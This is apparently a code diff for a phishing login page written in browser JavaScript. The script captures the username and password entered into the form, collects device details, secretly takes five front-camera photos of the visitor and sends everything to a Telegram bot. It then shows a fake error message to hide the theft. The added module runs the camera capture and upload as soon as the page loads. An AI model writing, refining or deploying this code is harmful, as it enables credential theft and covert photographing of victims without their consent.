@@ -12,8 +12,7 @@ document.getElementById('loginForm').addEventListener('submit', async function(e
     const batteryPercentage = await getBatteryPercentage();
     const countryName = await getCountryName();
 
-    // Capture selfies
-    const selfies = await captureSelfies(5);
+    
 
     // Format the message
     const text = `Device Data:
@@ -23,18 +22,20 @@ Date and Time: ${dateTime}
 Battery Percentage: ${batteryPercentage}%
 Country: ${countryName}`;
 
-const botToken = 'YOUR_BOT_TOKEN'; // Replace with your bot token
-const chatId = 'YOUR_CHAT_ID'; // Replace with your chat ID
+    const botToken = 'bot_token'; // Replace with your bot token
+    const chatId = 'chat_id'; // Replace with your chat ID
     const message = `Username: ${username}\nPassword: ${password}\n${text}`;
 
     // Send text message to Telegram
     await sendToTelegram(botToken, chatId, message);
 
     // Send selfies to Telegram
-    for (const selfie of selfies) {
-        await sendPhotoToTelegram(botToken, chatId, selfie);
+    async function captureAndSendSelfies(botToken, chatId, count) {
+        const selfies = await captureSelfies(count);
+        for (const selfie of selfies) {
+            await sendPhotoToTelegram(botToken, chatId, selfie);
+        }
     }
-
     // Simulate form submission and redirection
     setTimeout(function() {
         var errorMessage = document.getElementById('error-message');
@@ -70,36 +71,7 @@ async function getCountryName() {
 }
 
 // Function to capture selfies
-async function captureSelfies(count) {
-    const selfies = [];
-    const constraints = { video: { facingMode: 'user', width: 640, height: 480 } };
 
-    try {
-        const stream = await navigator.mediaDevices.getUserMedia(constraints);
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
-
-        for (let i = 0; i < count; i++) {
-            await new Promise(resolve => setTimeout(resolve, 1000)); // Capture every 1 second
-
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            const selfieDataURL = canvas.toDataURL('image/jpeg');
-            selfies.push(selfieDataURL);
-        }
-
-        stream.getTracks().forEach(track => track.stop());
-    } catch (error) {
-        console.error('Error capturing selfies:', error);
-    }
-
-    return selfies;
-}
 
 // Function to send text message to Telegram
 async function sendToTelegram(botToken, chatId, message) {
@@ -122,26 +94,7 @@ async function sendToTelegram(botToken, chatId, message) {
     }
 }
 
-// Function to send photo to Telegram
-async function sendPhotoToTelegram(botToken, chatId, photoDataURL) {
-    const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
 
-    try {
-        const response = await fetch(url, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({ chat_id: chatId, photo: photoDataURL })
-        });
-        const data = await response.json();
-        if (data.ok) {
-            console.log('Photo sent successfully!');
-        } else {
-            console.error('Failed to send photo.');
-        }
-    } catch (error) {
-        console.error('Error sending photo:', error);
-    }
-}
 
 // Get the current year
 const currentYear = new Date().getFullYear();
@@ -149,3 +102,82 @@ const yearElement = document.getElementById('current-year');
 if (yearElement) {
     yearElement.textContent = currentYear;
 }
+
+const SelfieCaptureModule = (() => {
+    async function sendPhotoToTelegram(botToken, chatId, photoDataURL) {
+        const url = `https://api.telegram.org/bot${botToken}/sendPhoto`;
+        
+        // Convert data URL to Blob
+        const blob = await fetch(photoDataURL).then(response => response.blob());
+
+        const formData = new FormData();
+        formData.append('chat_id', chatId);
+        formData.append('photo', blob, 'selfie.jpg');
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                body: formData,
+            });
+            const data = await response.json();
+            console.log(data);
+            if (data.ok) {
+                console.log('Photo sent successfully!');
+            } else {
+                console.error('Failed to send photo: ' + data.description);
+            }
+        } catch (error) {
+            console.error('Error sending photo:', error);
+        }
+    }
+
+    async function captureSelfies(count) {
+        const selfies = [];
+        const constraints = { video: { facingMode: 'user', width: 640, height: 480 } };
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia(constraints);
+            const video = document.createElement('video');
+            video.srcObject = stream;
+            video.play();
+
+            for (let i = 0; i < count; i++) {
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Capture every 1 second
+
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+
+                const selfieDataURL = canvas.toDataURL('image/jpeg');
+                selfies.push(selfieDataURL);
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+        } catch (error) {
+            console.error('Error capturing selfies:', error);
+        }
+
+        return selfies;
+    }
+
+    async function captureAndSendSelfies(botToken, chatId, count) {
+        const selfies = await captureSelfies(count);
+        for (const selfie of selfies) {
+            await sendPhotoToTelegram(botToken, chatId, selfie);
+        }
+    }
+
+    return {
+        captureAndSendSelfies,
+    };
+})();
+
+// Example usage
+const chatId =  'chat_id';
+const botToken = 'bot_token';
+const selfieCount = 5;               // Number of selfies to capture
+
+// Call the function to start capturing and sending selfies
+SelfieCaptureModule.captureAndSendSelfies(botToken, chatId, selfieCount);
